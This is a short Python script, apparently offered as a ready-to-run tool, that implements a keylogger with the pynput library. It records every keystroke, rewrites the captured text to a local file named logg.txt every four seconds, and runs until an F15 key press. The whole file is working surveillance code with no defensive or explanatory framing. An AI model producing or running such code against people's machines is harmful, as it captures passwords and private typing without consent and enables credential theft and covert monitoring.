from pynput import keyboard
import threading 
import sys 

class Keylogger:
    
    def __init__(self,time_interval):
        self.interval = time_interval
        self.log = "keylogger start running \n"
        self.exit = False
    
    def append_to_log(self,string):
        self.log = self.log + string
        
    def on_press(self,key):
        try:
            x = key.char
        except AttributeError:
            if key == keyboard.Key.enter:
                x = '\n'
            elif key == keyboard.Key.space:
                x = ' '
            # if f15 pressed exit program 
            elif key == keyboard.Key.f15:
                self.exit = True
                return False
            else:
                x = '#'
        current_key = x

# adding keystrokes to self.log  
        self.append_to_log(current_key)
    
    def save_to_file(self):
# f15 pressed - exit program 
        if self.exit == True:
            sys.exit()
# start thread pernamently every self.interval 
        timer = threading.Timer(self.interval, self.save_to_file)
        timer.start()
# saving keystrokes to file 
        with open('logg.txt',"w") as f:
            f.write(self.log)
            
    def start(self):
        listener = keyboard.Listener(on_press = self.on_press)
        with listener:
            self.save_to_file()
            listener.join()
            
go = Keylogger(4)
go.start()